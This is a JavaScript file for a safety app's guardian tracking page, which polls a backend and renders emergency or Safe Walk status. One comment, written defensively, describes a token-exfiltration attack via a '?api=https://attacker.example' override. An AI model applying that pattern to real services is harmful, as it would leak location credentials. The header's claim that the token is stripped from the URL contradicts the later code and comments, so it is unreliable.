/**
 * SERAYAE — guardian tracking view.
 *
 * Someone in trouble shared a link. This renders what the backend will say about
 * it, and nothing more.
 *
 * Rules this file holds to:
 *   - The token never leaves this page except as the API path it has to be. It
 *     is not logged, not put in the DOM, not sent to analytics (there is none
 *     here), and it is stripped from the address bar after load so it does not
 *     ride along in a screenshot or a shared browser tab.
 *   - Every string the API returns is inserted as text, never as HTML.
 *   - No freshness is claimed that the API does not provide. The location the
 *     backend returns is the user's last known position with no timestamp
 *     attached, so this page says "last known", not "live location".
 *   - Failure is never rendered as calm. If the status cannot be fetched, the
 *     page says so and offers a retry, because a guardian who sees a placid
 *     screen will assume everything is fine.
 */
(function () {
  'use strict';

  // The API origin is FIXED. A query-param override turned every tracking
  // link into a token-exfiltration primitive: ?api=https://attacker.example
  // hands the bearer token to the attacker in the request path. Never
  // reintroduce an origin override on this page — verify staging backends
  // with a local build instead.
  var DEFAULT_API = 'https://solra-backend-production.up.railway.app/api';

  var POLL_MS = 15000;          // how often to re-check while the page is open
  var POLL_CEILING_MS = 120000; // backoff ceiling after repeated failures

  var view = document.getElementById('view');
  var token = null;
  var apiBase = DEFAULT_API;
  var timer = null;
  var failures = 0;
  var stopped = false;

  // ── helpers ────────────────────────────────────────────────────────────────

  var UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

  /** Accepts /track/?t=<token> and /track/<token>, which is what the API mints. */
  function readToken() {
    var params = new URLSearchParams(window.location.search);
    var fromQuery = params.get('t');
    if (fromQuery && UUID_RE.test(fromQuery)) return fromQuery;

    var segments = window.location.pathname.split('/').filter(Boolean);
    var last = segments[segments.length - 1];
    if (last && UUID_RE.test(last)) return last;

    return null;
  }

  /*
   * On not scrubbing the token from the address bar.
   *
   * The first version of this file removed it after reading, on the theory that
   * a live-location credential should not sit in the URL. Testing killed that:
   * once the query is gone, a browser reload has nothing to read and the page
   * says "we can't find this link". A guardian following an emergency is exactly
   * the person who WILL pull-to-refresh, and turning their refresh into a dead
   * end is far worse than the URL being visible in a bar where their messaging
   * app already shows the same link. So the token stays, and `no-referrer` plus
   * `noopener noreferrer` keep it from travelling anywhere else.
   */

  function el(tag, className, text) {
    var node = document.createElement(tag);
    if (className) node.className = className;
    if (text !== undefined && text !== null) node.textContent = String(text);
    return node;
  }

  function clear() {
    while (view.firstChild) view.removeChild(view.firstChild);
  }

  /** Only ever called with a plain object of label -> text. */
  function factList(pairs) {
    var dl = el('dl', 'facts');
    pairs.forEach(function (pair) {
      if (pair[1] === null || pair[1] === undefined || pair[1] === '') return;
      var row = el('div', 'fact');
      row.appendChild(el('dt', null, pair[0]));
      row.appendChild(el('dd', null, pair[1]));
      dl.appendChild(row);
    });
    return dl;
  }

  function pill(text, variant) {
    var p = el('p', 'pill ' + (variant || ''));
    p.appendChild(el('span', 'dot'));
    p.appendChild(el('span', null, text));
    return p;
  }

  function humanDuration(seconds) {
    if (typeof seconds !== 'number' || !isFinite(seconds) || seconds <= 0) return null;
    var mins = Math.floor(seconds / 60);
    if (mins < 1) return 'under a minute';
    if (mins < 60) return mins + (mins === 1 ? ' minute' : ' minutes');
    var hrs = Math.floor(mins / 60);
    var rem = mins % 60;
    return hrs + (hrs === 1 ? ' hour' : ' hours') + (rem ? ' ' + rem + ' min' : '');
  }

  /**
   * Enum values arrive SCREAMING_CASE. Naive title-casing renders "SOS" as
   * "Sos", which looks like a typo on the one screen that has to look
   * trustworthy, so short all-caps tokens are left alone.
   */
  function titleCase(value) {
    if (typeof value !== 'string' || !value) return null;
    return value
      .split('_')
      .filter(Boolean)
      .map(function (word, index) {
        if (word.length <= 3 && word === word.toUpperCase()) return word;
        var lower = word.toLowerCase();
        return index === 0 ? lower.charAt(0).toUpperCase() + lower.slice(1) : lower;
      })
      .join(' ');
  }

  // ── render states ──────────────────────────────────────────────────────────

  function renderActive(data) {
    clear();
    view.setAttribute('aria-busy', 'false');

    var isEmergency = data.type === 'emergency';
    var name = typeof data.userName === 'string' && data.userName.trim() ? data.userName.trim() : 'Someone';

    view.appendChild(
      isEmergency
        ? pill('Emergency in progress', 'is-alarm')
        : pill('Safe Walk in progress', 'is-live')
    );

    view.appendChild(el('h1', null, isEmergency ? name + ' needs help.' : 'Walking with ' + name + '.'));

    view.appendChild(
      el(
        'p',
        'lede',
        isEmergency
          ? name + ' triggered an emergency on SERAYAE and shared this link with you. If you believe they are in immediate danger, call your local emergency number.'
          : name + ' is on a Safe Walk and shared this link with you. You will see it update while this page is open.'
      )
    );

    var facts = [];
    if (isEmergency) {
      facts.push(['Status', titleCase(data.status) || 'Active']);
      if (typeof data.emergencyType === 'string') facts.push(['Type', titleCase(data.emergencyType)]);
      if (typeof data.responderCount === 'number') {
        // Say plainly when it is zero. "0 responders" beats an empty row that
        // lets someone assume help is already moving.
        facts.push([
          'Responders',
          data.responderCount === 0 ? 'None yet' : String(data.responderCount) + ' on the way'
        ]);
      }
    } else {
      facts.push(['Status', titleCase(data.status) || 'Active']);
      var remaining = humanDuration(data.timeRemaining);
      if (remaining) facts.push(['Expected back in', remaining]);
      if (data.escalated === true) facts.push(['Check-in', 'Missed — escalated']);
    }
    view.appendChild(factList(facts));

    var actions = el('div', 'actions');

    var loc = data.lastLocation;
    if (loc && typeof loc.lat === 'number' && typeof loc.lng === 'number') {
      var maps = el('a', 'btn btn-primary', 'Open last known location');
      maps.href = 'https://www.google.com/maps?q=' + encodeURIComponent(loc.lat + ',' + loc.lng);
      maps.target = '_blank';
      // noreferrer is the one that matters: without it the token travels to
      // Google in the Referer header.
      maps.rel = 'noopener noreferrer';
      actions.appendChild(maps);
    }

    var refresh = el('button', 'btn btn-ghost', 'Refresh now');
    refresh.type = 'button';
    refresh.addEventListener('click', function () { load(true); });
    actions.appendChild(refresh);
    view.appendChild(actions);

    var note = el('p', 'note');
    if (loc && typeof loc.lat === 'number') {
      note.appendChild(el('strong', null, 'This is a last known position, not a live trail. '));
      note.appendChild(
        document.createTextNode(
          'It updates while this page is open. The link stops working when ' + name.split(' ')[0] +
          ' revokes it, or within 24 hours.'
        )
      );
    } else {
      note.appendChild(el('strong', null, 'No location available yet. '));
      note.appendChild(
        document.createTextNode(
          'SERAYAE has not received a position for this session. The status above still updates while this page is open.'
        )
      );
    }
    view.appendChild(note);
  }

  function renderOver(message) {
    stop();
    clear();
    view.setAttribute('aria-busy', 'false');
    view.appendChild(pill('No longer active', 'is-over'));
    view.appendChild(el('h1', null, 'This link has been turned off.'));
    view.appendChild(
      el(
        'p',
        'lede',
        message ||
          'The person who shared it has stopped sharing their location, or the link reached its 24-hour limit. Nothing is wrong on your end.'
      )
    );
    view.appendChild(
      el(
        'p',
        'lede',
        'If you are worried about them, contact them directly — or your local emergency number if you believe they are in danger.'
      )
    );
  }

  function renderUnknown() {
    stop();
    clear();
    view.setAttribute('aria-busy', 'false');
    view.appendChild(pill('Link not recognised', 'is-over'));
    view.appendChild(el('h1', null, 'We can\u2019t find this link.'));
    view.appendChild(
      el(
        'p',
        'lede',
        'It may have been copied incompletely, or it was never a SERAYAE tracking link. Ask the person to share it again.'
      )
    );
    var actions = el('div', 'actions');
    var home = el('a', 'btn btn-ghost', 'Go to serayae.me');
    home.href = '/';
    actions.appendChild(home);
    view.appendChild(actions);
  }

  function renderError() {
    clear();
    view.setAttribute('aria-busy', 'false');
    view.appendChild(pill('Status unavailable', 'is-over'));
    view.appendChild(el('h1', null, 'We can\u2019t reach SERAYAE right now.'));
    view.appendChild(
      el(
        'p',
        'lede',
        'This does not mean the person is safe, and it does not mean they are not. We simply cannot confirm their status from here.'
      )
    );
    view.appendChild(
      el('p', 'lede', 'If you are worried, contact them directly, or call your local emergency number.')
    );
    var actions = el('div', 'actions');
    var retry = el('button', 'btn btn-primary', 'Try again');
    retry.type = 'button';
    retry.addEventListener('click', function () { failures = 0; load(true); });
    actions.appendChild(retry);
    view.appendChild(actions);
  }

  // ── fetching ───────────────────────────────────────────────────────────────

  function schedule() {
    if (stopped) return;
    clearTimeout(timer);
    // Back off when the API is failing so a page left open on a locked phone
    // does not hammer a struggling backend.
    var delay = failures > 0 ? Math.min(POLL_MS * Math.pow(2, failures), POLL_CEILING_MS) : POLL_MS;
    timer = setTimeout(function () { load(false); }, delay);
  }

  function stop() {
    stopped = true;
    clearTimeout(timer);
  }

  function load(isManual) {
    if (stopped && !isManual) return;
    if (isManual) { stopped = false; }

    var url = apiBase + '/guardian/track/' + encodeURIComponent(token);

    fetch(url, { method: 'GET', credentials: 'omit', cache: 'no-store' })
      .then(function (res) {
        return res.json().catch(function () { return null; }).then(function (body) {
          return { status: res.status, body: body };
        });
      })
      .then(function (result) {
        var status = result.status;
        var body = result.body || {};

        if (status === 200 && body.success && body.data) {
          failures = 0;
          renderActive(body.data);
          schedule();
          return;
        }
        if (status === 410) {
          // Revoked and expired both answer 410. The difference does not change
          // what the reader should do, so both read the same.
          renderOver();
          return;
        }
        if (status === 404 || status === 400) {
          // Only OUR api says "no such link". A 404 from anything else means we
          // never reached the API at all — and telling a guardian their link is
          // bad when the service is simply down is the exact false calm this
          // page exists to avoid. Seen for real: the backend host currently
          // answers Railway's {"status":"error","code":404,"message":
          // "Application not found"} at every path, which is indistinguishable
          // from a missing link unless the body shape is checked.
          if (body && body.success === false && typeof body.error === 'string') {
            renderUnknown();
            return;
          }
          throw new Error('404 from something that is not the SERAYAE api');
        }
        throw new Error('unexpected status ' + status);
      })
      .catch(function () {
        failures += 1;
        renderError();
        // Keep trying in the background: a guardian may leave this open while
        // the network comes back.
        schedule();
      });
  }

  // ── boot ───────────────────────────────────────────────────────────────────

  token = readToken();
  if (!token) {
    renderUnknown();
    return;
  }
  load(true);

  // Do not poll a page nobody is looking at; refresh immediately when they
  // come back, since a stale emergency status is worse than none.
  document.addEventListener('visibilitychange', function () {
    if (document.hidden) {
      clearTimeout(timer);
    } else if (!stopped) {
      load(false);
    }
  });
})();
